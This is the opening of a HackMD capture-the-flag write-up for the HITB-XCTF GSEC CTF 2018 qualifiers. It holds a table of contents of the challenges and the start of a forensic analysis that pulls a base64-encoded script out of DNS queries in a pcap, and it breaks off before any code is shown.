<!DOCTYPE html>

<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="mobile-web-app-capable" content="yes">
    <title>
        HITB-XCTF GSEC CTF 2018 Quals - HackMD
    </title>
    <link rel="icon" type="image/png" href="https://hackmd.io/favicon.png">
    <link rel="apple-touch-icon" href="https://hackmd.io/apple-touch-icon.png">

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha256-916EbMg70RQy9LHiGkXzG8hSg9EdNy97GazNG/aiY1w=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css" integrity="sha256-3iu9jgsy9TpTwXKb7bNQzqWekRX7pPK+2OLj3R922fo=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/octicons/3.5.0/octicons.min.css" integrity="sha256-QiWfLIsCT02Sdwkogf6YMiQlj4NE84MKkzEMkZnMGdg=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.5.1/themes/prism.min.css" integrity="sha256-vtR0hSWRc3Tb26iuN2oZHt3KRUomwTufNIf5/4oeCyg=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.7.0/styles/github-gist.min.css" integrity="sha256-tAflq+ymku3Khs+I/WcAneIlafYgDiOQ9stIHH985Wo=" crossorigin="anonymous" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/emojify.js/1.1.0/css/basic/emojify.min.css" integrity="sha256-UOrvMOsSDSrW6szVLe8ZDZezBxh5IoIfgTwdNDgTjiU=" crossorigin="anonymous" />
    <style>
        @import url(https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,400italic,600,600italic,300italic,300|Source+Serif+Pro|Source+Code+Pro:400,300,500&subset=latin,latin-ext);.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;font-size:16px;line-height:1.5;word-wrap:break-word}.markdown-body:after,.markdown-body:before{display:table;content:""}.markdown-body:after{clear:both}.markdown-body>:first-child{margin-top:0!important}.markdown-body>:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body .absent{color:#c00}.markdown-body .anchor{float:left;padding-right:4px;margin-left:-20px;line-height:1}.markdown-body .anchor:focus{outline:none}.markdown-body blockquote,.markdown-body dl,.markdown-body ol,.markdown-body p,.markdown-body pre,.markdown-body table,.markdown-body ul{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;padding:0;margin:24px 0;background-color:#e7e7e7;border:0}.markdown-body blockquote{padding:0 1em;color:#777;border-left:.25em solid #ddd}.markdown-body blockquote>:first-child{margin-top:0}.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body .loweralpha{list-style-type:lower-alpha}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin-top:24px;margin-bottom:16px;font-weight:600;line-height:1.25}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:#000;vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1 code,.markdown-body h1 tt,.markdown-body h2 code,.markdown-body h2 tt,.markdown-body h3 code,.markdown-body h3 tt,.markdown-body h4 code,.markdown-body h4 tt,.markdown-body h5 code,.markdown-body h5 tt,.markdown-body h6 code,.markdown-body h6 tt{font-size:inherit}.markdown-body h1{font-size:2em}.markdown-body h1,.markdown-body h2{padding-bottom:.3em;border-bottom:1px solid #eee}.markdown-body h2{font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{font-size:.85em;color:#777}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol.no-list,.markdown-body ul.no-list{padding:0;list-style-type:none}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:0;margin-bottom:0}.markdown-body li>p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:700}.markdown-body dl dd{padding:0 16px;margin-bottom:16px}.markdown-body table{display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}.markdown-body table th{font-weight:700}.markdown-body table td,.markdown-body table th{padding:6px 13px;border:1px solid #ddd}.markdown-body table tr{background-color:#fff;border-top:1px solid #ccc}.markdown-body table tr:nth-child(2n){background-color:#f8f8f8}.markdown-body img{max-width:100%;box-sizing:content-box;background-color:#fff}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body .emoji{max-width:none;vertical-align:text-top;background-color:transparent}.markdown-body span.frame{display:block;overflow:hidden}.markdown-body span.frame>span{display:block;float:left;width:auto;padding:7px;margin:13px 0 0;overflow:hidden;border:1px solid #ddd}.markdown-body span.frame span img{display:block;float:left}.markdown-body span.frame span span{display:block;padding:5px 0 0;clear:both;color:#333}.markdown-body span.align-center{display:block;overflow:hidden;clear:both}.markdown-body span.align-center>span{display:block;margin:13px auto 0;overflow:hidden;text-align:center}.markdown-body span.align-center span img{margin:0 auto;text-align:center}.markdown-body span.align-right{display:block;overflow:hidden;clear:both}.markdown-body span.align-right>span{display:block;margin:13px 0 0;overflow:hidden;text-align:right}.markdown-body span.align-right span img{margin:0;text-align:right}.markdown-body span.float-left{display:block;float:left;margin-right:13px;overflow:hidden}.markdown-body span.float-left span{margin:13px 0 0}.markdown-body span.float-right{display:block;float:right;margin-left:13px;overflow:hidden}.markdown-body span.float-right>span{display:block;margin:13px auto 0;overflow:hidden;text-align:right}.markdown-body code,.markdown-body tt{padding:0;padding-top:.2em;padding-bottom:.2em;margin:0;font-size:85%;background-color:rgba(0,0,0,.04);border-radius:3px}.markdown-body code:after,.markdown-body code:before,.markdown-body tt:after,.markdown-body tt:before{letter-spacing:-.2em;content:"\A0"}.markdown-body code br,.markdown-body tt br{display:none}.markdown-body del code{text-decoration:inherit}.markdown-body pre{word-wrap:normal}.markdown-body pre>code{padding:0;margin:0;font-size:100%;word-break:normal;white-space:pre;background:transparent;border:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{margin-bottom:0;word-break:normal}.markdown-body .highlight pre,.markdown-body pre{padding:16px;overflow:auto;font-size:85%;line-height:1.45;background-color:#f7f7f7;border-radius:3px}.markdown-body pre code,.markdown-body pre tt{display:inline;max-width:auto;padding:0;margin:0;overflow:visible;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}.markdown-body pre code:after,.markdown-body pre code:before,.markdown-body pre tt:after,.markdown-body pre tt:before{content:normal}.markdown-body .csv-data td,.markdown-body .csv-data th{padding:5px;overflow:hidden;font-size:12px;line-height:1;text-align:left;white-space:nowrap}.markdown-body .csv-data .blob-line-num{padding:10px 8px 9px;text-align:right;background:#fff;border:0}.markdown-body .csv-data tr{border-top:0}.markdown-body .csv-data th{font-weight:700;background:#f8f8f8;border-top:0}.markdown-body kbd{display:inline-block;padding:3px 5px;font-size:11px;line-height:10px;color:#555;vertical-align:middle;background-color:#fcfcfc;border:1px solid #ccc;border-bottom-color:#bbb;border-radius:3px;box-shadow:inset 0 -1px 0 #bbb}.news .alert .markdown-body blockquote{padding:0 0 0 40px;border:0 none}.activity-tab .news .alert .commits,.activity-tab .news .markdown-body blockquote{padding-left:0}.task-list-item{list-style-type:none}.task-list-item label{font-weight:400}.task-list-item.enabled label{cursor:pointer}.task-list-item+.task-list-item{margin-top:3px}.task-list-item-checkbox{float:left;margin:.31em 0 .2em -1.3em!important;vertical-align:middle;cursor:default!important}.markdown-body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,sans-serif;padding-top:40px;padding-bottom:40px;max-width:758px;overflow:visible!important}.markdown-body pre{border:inherit!important}.markdown-body code{color:inherit!important}.markdown-body pre code .wrapper{display:-moz-inline-flex;display:-ms-inline-flex;display:-o-inline-flex;display:inline-flex}.markdown-body pre code .gutter{float:left;overflow:hidden;-webkit-user-select:none;user-select:none}.markdown-body pre code .gutter.linenumber{text-align:right;position:relative;display:inline-block;cursor:default;z-index:4;padding:0 8px 0 0;min-width:20px;box-sizing:content-box;color:#afafaf!important;border-right:3px solid #6ce26c!important}.markdown-body pre code .gutter.linenumber>span:before{content:attr(data-linenumber)}.markdown-body pre code .code{float:left;margin:0 0 0 16px}.markdown-body .gist .line-numbers{border-left:none;border-top:none;border-bottom:none}.markdown-body .gist .line-data{border:none}.markdown-body .gist table{border-spacing:0;border-collapse:inherit!important}.markdown-body code[data-gist-id]{background:none;padding:0}.markdown-body code[data-gist-id]:after,.markdown-body code[data-gist-id]:before{content:""}.markdown-body code[data-gist-id] .blob-num{border:unset}.markdown-body code[data-gist-id] table{overflow:unset;margin-bottom:unset}.markdown-body code[data-gist-id] table tr{background:unset}.markdown-body[dir=rtl] pre{direction:ltr}.markdown-body[dir=rtl] code{direction:ltr;unicode-bidi:embed}.markdown-body .alert>p{margin-bottom:0}.markdown-body pre.abc,.markdown-body pre.flow-chart,.markdown-body pre.graphviz,.markdown-body pre.mermaid,.markdown-body pre.sequence-diagram{text-align:center;background-color:inherit;border-radius:0;white-space:inherit}.markdown-body pre.abc>code,.markdown-body pre.flow-chart>code,.markdown-body pre.graphviz>code,.markdown-body pre.mermaid>code,.markdown-body pre.sequence-diagram>code{text-align:left}.markdown-body pre.abc>svg,.markdown-body pre.flow-chart>svg,.markdown-body pre.graphviz>svg,.markdown-body pre.mermaid>svg,.markdown-body pre.sequence-diagram>svg{max-width:100%;height:100%}.markdown-body pre>code.wrap{white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word}.markdown-body .alert>p,.markdown-body .alert>ul{margin-bottom:0}.markdown-body summary{display:list-item}.markdown-body summary:focus{outline:none}.markdown-body details summary{cursor:pointer}.markdown-body details:not([open])>:not(summary){display:none}.markdown-body figure{margin:1em 40px}.vimeo,.youtube{cursor:pointer;display:table;text-align:center;background-position:50%;background-repeat:no-repeat;background-size:contain;background-color:#000;overflow:hidden}.vimeo,.youtube{position:relative;width:100%}.youtube{padding-bottom:56.25%}.vimeo img{width:100%;object-fit:contain;z-index:0}.youtube img{object-fit:cover;z-index:0}.vimeo iframe,.youtube iframe,.youtube img{width:100%;height:100%;position:absolute;top:0;left:0}.vimeo iframe,.youtube iframe{vertical-align:middle;z-index:1}.vimeo .icon,.youtube .icon{position:absolute;height:auto;width:auto;top:50%;left:50%;transform:translate(-50%,-50%);color:#fff;opacity:.3;transition:opacity .2s;z-index:0}.vimeo:hover .icon,.youtube:hover .icon{opacity:.6;transition:opacity .2s}.slideshare .inner,.speakerdeck .inner{position:relative;width:100%}.slideshare .inner iframe,.speakerdeck .inner iframe{position:absolute;top:0;bottom:0;left:0;right:0;width:100%;height:100%}.MJX_Assistive_MathML{display:none}.ui-infobar{position:relative;z-index:2;max-width:758px;margin-top:25px;margin-bottom:-25px;color:#777}.ui-toc{position:fixed;bottom:20px;z-index:10000}.ui-toc-label{opacity:.3;background-color:#ccc;border:none;transition:opacity .2s}.ui-toc .open .ui-toc-label{opacity:1;color:#fff;transition:opacity .2s}.ui-toc-label:focus{opacity:.3;background-color:#ccc;color:#000}.ui-toc-label:hover{opacity:1;background-color:#ccc;transition:opacity .2s}.ui-toc-dropdown{margin-top:23px;margin-bottom:20px;padding-left:10px;padding-right:10px;max-width:45vw;width:25vw;max-height:70vh;overflow:auto;text-align:inherit}.ui-toc-dropdown>.toc{max-height:calc(70vh - 100px);overflow:auto}.ui-toc-dropdown[dir=rtl] .nav{padding-right:0;letter-spacing:.0029em}.ui-toc-dropdown a{overflow:hidden;text-overflow:ellipsis;white-space:pre}.ui-toc-dropdown .nav>li>a{display:block;padding:4px 20px;font-size:13px;font-weight:500;color:#767676}.ui-toc-dropdown .nav>li:first-child:last-child > ul,.ui-toc-dropdown .toc.expand ul{display:block}.ui-toc-dropdown .nav>li>a:focus,.ui-toc-dropdown .nav>li>a:hover{padding-left:19px;color:#000;text-decoration:none;background-color:transparent;border-left:1px solid #000}.ui-toc-dropdown[dir=rtl] .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav>li>a:hover{padding-right:19px;border-left:none;border-right:1px solid #000}.ui-toc-dropdown .nav>.active:focus>a,.ui-toc-dropdown .nav>.active:hover>a,.ui-toc-dropdown .nav>.active>a{padding-left:18px;font-weight:700;color:#000;background-color:transparent;border-left:2px solid #000}.ui-toc-dropdown[dir=rtl] .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav>.active>a{padding-right:18px;border-left:none;border-right:2px solid #000}.ui-toc-dropdown .nav .nav{display:none;padding-bottom:10px}.ui-toc-dropdown .nav>.active>ul{display:block}.ui-toc-dropdown .nav .nav>li>a{padding-top:1px;padding-bottom:1px;padding-left:30px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a{padding-right:30px}.ui-toc-dropdown .nav .nav>li>ul>li>a{padding-top:1px;padding-bottom:1px;padding-left:40px;font-size:12px;font-weight:400}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a{padding-right:40px}.ui-toc-dropdown .nav .nav>li>a:focus,.ui-toc-dropdown .nav .nav>li>a:hover{padding-left:29px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>a:hover{padding-right:29px}.ui-toc-dropdown .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown .nav .nav>li>ul>li>a:hover{padding-left:39px}.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:focus,.ui-toc-dropdown[dir=rtl] .nav .nav>li>ul>li>a:hover{padding-right:39px}.ui-toc-dropdown .nav .nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>a{padding-left:28px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>a{padding-right:28px}.ui-toc-dropdown .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown .nav .nav>.active>.nav>.active>a{padding-left:38px;font-weight:500}.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:focus>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active:hover>a,.ui-toc-dropdown[dir=rtl] .nav .nav>.active>.nav>.active>a{padding-right:38px}.markdown-body[lang^=ja]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,Hiragino Kaku Gothic Pro,\\30D2\30E9\30AE\30CE\89D2\30B4 Pro W3,Osaka,Meiryo,\\30E1\30A4\30EA\30AA,MS Gothic,"\FF2D\FF33   \30B4\30B7\30C3\30AF",sans-serif}.ui-toc-dropdown[lang^=ja]{font-family:Source Sans Pro,Helvetica,Arial,Meiryo UI,MS PGothic,"\FF2D\FF33   \FF30\30B4\30B7\30C3\30AF",sans-serif}.markdown-body[lang=zh-tw]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,PingFang TC,Microsoft JhengHei,\\5FAE\8EDF\6B63\9ED1,sans-serif}.ui-toc-dropdown[lang=zh-tw]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft JhengHei UI,\\5FAE\8EDF\6B63\9ED1UI,sans-serif}.markdown-body[lang=zh-cn]{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Helvetica,Arial,PingFang SC,Microsoft YaHei,\\5FAE\8F6F\96C5\9ED1,sans-serif}.ui-toc-dropdown[lang=zh-cn]{font-family:Source Sans Pro,Helvetica,Arial,Microsoft YaHei UI,\\5FAE\8F6F\96C5\9ED1UI,sans-serif}.ui-affix-toc{position:fixed;top:0;max-width:15vw;max-height:70vh;overflow:auto}.back-to-top,.expand-toggle,.go-to-bottom{display:block;padding:4px 10px;margin-top:10px;margin-left:10px;font-size:12px;font-weight:500;color:#999}.back-to-top:focus,.back-to-top:hover,.expand-toggle:focus,.expand-toggle:hover,.go-to-bottom:focus,.go-to-bottom:hover{color:#563d7c;text-decoration:none}.back-to-top,.go-to-bottom{margin-top:0}.ui-user-icon{width:20px;height:20px;display:block;border-radius:3px;margin-top:2px;margin-bottom:2px;margin-right:5px;background-position:50%;background-repeat:no-repeat;background-size:contain}.ui-user-icon.small{width:18px;height:18px;display:inline-block;vertical-align:middle;margin:0 0 .2em}.ui-infobar>small>span{line-height:22px}.ui-infobar>small .dropdown{display:inline-block}.ui-infobar>small .dropdown a:focus,.ui-infobar>small .dropdown a:hover{text-decoration:none}.unselectable{-moz-user-select:none;-webkit-user-select:none;-o-user-select:none;user-select:none}@media print{blockquote,div,img,pre,table{page-break-inside:avoid!important}a[href]:after{font-size:12px!important}}.markdown-body.slides{position:relative;z-index:1;color:#222}.markdown-body.slides:before{content:"";display:block;position:absolute;top:0;left:0;right:0;bottom:0;z-index:-1;background-color:currentColor;box-shadow:0 0 0 50vw}.markdown-body.slides section[data-markdown]{position:relative;margin-bottom:1.5em;background-color:#fff;text-align:center}.markdown-body.slides section[data-markdown] code{text-align:left}.markdown-body.slides section[data-markdown]:before{content:"";display:block;padding-bottom:56.23%}.markdown-body.slides section[data-markdown]>div:first-child{position:absolute;top:50%;left:1em;right:1em;transform:translateY(-50%);max-height:100%;overflow:hidden}.markdown-body.slides section[data-markdown]>ul{display:inline-block}.markdown-body.slides>section>section+section:after{content:"";position:absolute;top:-1.5em;right:1em;height:1.5em;border:3px solid #777}body{font-smoothing:subpixel-antialiased!important;-webkit-font-smoothing:subpixel-antialiased!important;-moz-osx-font-smoothing:auto!important;text-shadow:0 0 1em transparent,1px 1px 1.2px rgba(0,0,0,.004);-webkit-overflow-scrolling:touch;font-family:Source Sans Pro,Helvetica,Arial,sans-serif;letter-spacing:.025em}.focus,:focus{outline:none!important}::-moz-focus-inner{border:0!important}body.modal-open{overflow-y:auto;padding-right:0!important}
    </style>
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    	<script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js" integrity="sha256-3Jy/GbSLrg0o9y5Z5n1uw0qxZECH7C6OQpVBgNFYa0g=" crossorigin="anonymous"></script>
    	<script src="https://cdnjs.cloudflare.com/ajax/libs/respond.js/1.4.2/respond.min.js" integrity="sha256-g6iAfvZp+nDQ2TdTR/VVKJf3bGro4ub5fvWSWVRi2NE=" crossorigin="anonymous"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/es5-shim/4.5.9/es5-shim.min.js" integrity="sha256-8E4Is26QH0bD52WoQpcB+R/tcWQtpzlCojrybUd7Mxo=" crossorigin="anonymous"></script>
    <![endif]-->
</head>

<body>
    <div id="doc" class="markdown-body container-fluid"><h1 id="HITB-XCTF-GSEC-CTF-2018-Quals" style=""><a class="anchor hidden-xs" href="#HITB-XCTF-GSEC-CTF-2018-Quals" title="HITB-XCTF-GSEC-CTF-2018-Quals"><span class="octicon octicon-link"></span></a>HITB-XCTF GSEC CTF 2018 Quals</h1><p></p><div class="toc"><ul><li><a href="#HITB-XCTF-GSEC-CTF-2018-Quals" title="HITB-XCTF GSEC CTF 2018 Quals">HITB-XCTF GSEC CTF 2018 Quals</a><ul><li><a href="#rev" title="rev">rev</a><ul><li><a href="#hacku-sces60107" title="hacku (sces60107)">hacku (sces60107)</a></li><li><a href="#sdsun-sces60107-sasdf" title="sdsun (sces60107 sasdf)">sdsun (sces60107 sasdf)</a></li><li><a href="#hex-sasdf" title="hex (sasdf)">hex (sasdf)</a></li></ul></li><li><a href="#misc" title="misc">misc</a><ul><li><a href="#tpyx-sces60107" title="tpyx (sces60107)">tpyx (sces60107)</a></li><li><a href="#readfile-sces60107" title="readfile (sces60107)">readfile (sces60107)</a></li><li><a href="#pix-sces60107" title="pix (sces60107)">pix (sces60107)</a></li></ul></li><li><a href="#pwn" title="pwn">pwn</a><ul><li><a href="#once-kevin47" title="once (kevin47)">once (kevin47)</a></li><li><a href="#gundam-kevin47" title="gundam (kevin47)">gundam (kevin47)</a></li><li><a href="#d-kevin47" title="d (kevin47)">d (kevin47)</a></li><li><a href="#babypwn-how2hack" title="babypwn (how2hack)">babypwn (how2hack)</a></li></ul></li><li><a href="#web" title="web">web</a><ul><li><a href="#Upload-bookgin" title="Upload (bookgin)">Upload (bookgin)</a></li><li><a href="#Python’s-revenge-sasdf" title="Python’s revenge (sasdf)">Python’s revenge (sasdf)</a></li><li><a href="#PHP-lover-bookgin-amp-sces60107" title="PHP lover (bookgin &amp; sces60107)">PHP lover (bookgin &amp; sces60107)</a></li><li><a href="#baby-baby-bookgin" title="baby baby (bookgin)">baby baby (bookgin)</a></li><li><a href="#baby-nya-bookgin" title="baby nya (bookgin)">baby nya (bookgin)</a></li><li><a href="#baby-fs-unsolved-written-by-bookgin-thanks-to-the-organizer-QQ-group" title="baby fs (unsolved, written by bookgin, thanks to the organizer QQ group)">baby fs (unsolved, written by bookgin, thanks to the organizer QQ group)</a></li><li><a href="#3pigs-unsolved-written-by-how2hack" title="3pigs (unsolved, written by how2hack)">3pigs (unsolved, written by how2hack)</a></li></ul></li><li><a href="#crypto" title="crypto">crypto</a><ul><li><a href="#easy_block-sasdf" title="easy_block (sasdf)">easy_block (sasdf)</a></li><li><a href="#easy_pub-sasdf" title="easy_pub (sasdf)">easy_pub (sasdf)</a></li><li><a href="#streamgamex-sasdf" title="streamgamex (sasdf)">streamgamex (sasdf)</a></li><li><a href="#base-how2hack" title="base (how2hack)">base (how2hack)</a></li></ul></li><li><a href="#mobile" title="mobile">mobile</a><ul><li><a href="#kivy-simple-sces60107" title="kivy simple (sces60107)">kivy simple (sces60107)</a></li><li><a href="#multicheck-sasdf" title="multicheck (sasdf)">multicheck (sasdf)</a></li></ul></li></ul></li></ul></div><p></p><h2 id="rev" style=""><a class="anchor hidden-xs" href="#rev" title="rev"><span class="octicon octicon-link"></span></a>rev</h2><h3 id="hacku-sces60107" style=""><a class="anchor hidden-xs" href="#hacku-sces60107" title="hacku-sces60107"><span class="octicon octicon-link"></span></a>hacku (sces60107)</h3><p>In this challenge give us two file. A pcap file and a chm file.</p><p>The chm file is useless. The pcap file has a large size, because it is downloading windows update file.</p><p>After some digging, I found the dns query is interesting. we can extract some base64 string. And I found a script after base64 decoding.</p><pre><code class="ps1 hljs"><div class="wrapper"><div class="gutter linenumber"><span data-linenumber="1"></span>
<span data-linenumber="2"></span>
<span data-linenumber="3"></span>
<span data-linenumber="4"></span>
<span data-linenumber="5"></span>
<span data-linenumber="6"></span>
<span data-linenumber="7"></span>
<span data-linenumber="8"></span>
<span data-linenumber="9"></span>
<span data-linenumber="10"></span>
<span data-linenumber="11"></span>
<span data-linenumber="12"></span>
<span data-linenumber="13"></span>
<span data-linenumber="14"></span>
<span data-linenumber="15"></span>
<span data-linenumber="16"></span>
<span data-linenumber="17"></span>
<span data-linenumber="18"></span>
<span data-linenumber="19"></span>
<span data-linenumber="20"></span>
<span data-linenumber="21"></span>
<span data-linenumber="22"></span>
<span data-linenumber="23"></span>
<span data-linenumber="24"></span>
<span data-linenumber="25"></span>
<span data-linenumber="26"></span>
<span data-linenumber="27"></span>
<span data-linenumber="28"></span>
<span data-linenumber="29"></span>
<span data-linenumber="30"></span>
<span data-linenumber="31"></span>
<span data-linenumber="32"></span>
<span data-linenumber="33"></span>
<span data-linenumber="34"></span>
<span data-linenumber="35"></span>
<span data-linenumber="36"></span>
<span data-linenumber="37"></span>
<span data-linenumber="38"></span>
<span data-linenumber="39"></span>
<span data-linenumber="40"></span>
<span data-linenumber="41"></span>
<span data-linenumber="42"></span>
<span data-linenumber="43"></span>
<span data-linenumber="44"></span>
<span data-linenumber="45"></span>
<span data-linenumber="46"></span>
<span data-linenumber="47"></span>
<span data-linenumber="48"></span>
<span data-linenumber="49"></span>
<span data-linenumber="50"></span>
<span data-linenumber="51"></span>
<span data-linenumber="52"></span>
<span data-linenumber="53"></span>
<span data-linenumber="54"></span>
<span data-linenumber="55"></span>
<span data-linenumber="56"></span>
<span data-linenumber="57"></span>
<span data-linenumber="58"></span>
<span data-linenumber="59"></span>
<span data-linenumber="60"></span>
<span data-linenumber="61"></span>
<span data-linenumber="62"></span>
<span data-linenumber="63"></span>
<span data-linenumber="64"></span>
<span data-linenumber="65"></span>
<span data-linenumber="66"></span>
<span data-linenumber="67"></span>
<span data-linenumber="68"></span>
<span data-linenumber="69"></span>
<span data-linenumber="70"></span>
<span data-linenumber="71"></span>
<span data-linenumber="72"></span>
<span data-linenumber="73"></span>
<span data-linenumber="74"></span>
<span data-linenumber="75"></span>
<span data-linenumber="76"></span>
<span data-linenumber="77"></span>
<span data-linenumber="78"></span>
<span data-linenumber="79"></span>
<span data-linenumber="80"></span>
<span data-linenumber="81"></span>
<span data-linenumber="82"></span>
<span data-linenumber="83"></span>
<span data-linenumber="84"></span>
<span data-linenumber="85"></span>
<span data-linenumber="86"></span>
<span data-linenumber="87"></span>
<span data-linenumber="88"></span>
<span data-linenumber="89"></span>
<span data-linenumber="90"></span>
<span data-linenumber="91"></span>
<span data-linenumber="92"></span>
<span data-linenumber="93"></span>
<span data-linenumber="94"></span>
<span data-linenumber="95"></span>
<span data-linenumber="96"></span>
<span data-linenumber="97"></span>
<span data-linenumber="98"></span>
<span data-linenumber="99"></span>
<span data-linenumber="100"></span>
<span data-linenumber="101"></span>
<span data-linenumber="102"></span>
<span data-linenumber="103"></span>
<span data-linenumber="104"></span>
<span data-linenumber="105"></span>
<span data-linenumber="106"></span>
<span data-linenumber="107"></span>
<span data-linenumber="108"></span>
<span data-linenumber="109"></span>
<span data-linenumber="110"></span>
<span data-linenumber="111"></span>
<span data-linenumber="112"></span>
<span data-linenumber="113"></span>
<span data-linenumber="114"></span>
<span data-linenumber="115"></span>
<span data-linenumber="116"></span>
<span data-linenumber="117"></span>
<span data-linenumber="118"></span>
<span data-linenumber="119"></span>
<span data-linenumber="120"></span>
<span data-linenumber="121"></span>
<span data-linenumber="122"></span>
<span data-linenumber="123"></span>
<span data-linenumber="124"></span>
<span data-linenumber="125"></span>
<span data-linenumber="126"></span>
<span data-linenumber="127"></span>
<span data-linenumber="128"></span>
<span data-linenumber="129"></span>
<span data-linenumber="130"></span>
<span data-linenumber="131"></span>
<span data-linenumber="132"></span>
<span data-linenumber="133"></span>
<span data-linenumber="134"></span>
<span data-linenumber="135"></span>
<span data-linenumber="136"></span>
<span data-linenumber="137"></span>
<span data-linenumber="138"></span>
<span data-linenumber="139"></span>
<span data-linenumber="140"></span>
<span data-linenumber="141"></span>
<span data-linenumber="142"></span>
<span data-linenumber="143"></span>
<span data-linenumber="144"></span>
<span data-linenumber="145"></span>
<span data-linenumber="146"></span>
<span data-linenumber="147"></span>
<span data-linenumber="148"></span>
<span data-linenumber="149"></span>
<span data-linenumber="150"></span>
<span data-linenumber="151"></span>
<span data-linenumber="152"></span>
<span data-linenumber="153"></span>
<span data-linenumber="154"></span>
<span data-linenumber="155"></span>
<span data-linenumber="156"></span>
<span data-linenumber="157"></span>
<span data-linenumber="158"></span>
<span data-linenumber="159"></span>
<span data-linenumber="160"></span>
<span data-linenumber="161"></span>
<span data-linenumber="162"></span>
<span data-linenumber="163"></span>
<span data-linenumber="164"></span>
<span data-linenumber="165"></span>
<span data-linenumber="166"></span>
<span data-linenumber="167"></span>
<span data-linenumber="168"></span>
<span data-linenumber="169"></span>
<span data-linenumber="170"></span>
<span data-linenumber="171"></span>
<span data-linenumber="172"></span>
<span data-linenumber="173"></span>
<span data-linenumber="174"></span>
<span data-linenumber="175"></span>
<span data-linenumber="176"></span>
<span data-linenumber="177"></span>
<span data-linenumber="178"></span>
<span data-linenumber="179"></span>
<span data-linenumber="180"></span>
<span data-linenumber="181"></span>
<span data-linenumber="182"></span>
<span data-linenumber="183"></span>
<span data-linenumber="184"></span>
<span data-linenumber="185"></span>
<span data-linenumber="186"></span>
<span data-linenumber="187"></span>
<span data-linenumber="188"></span>
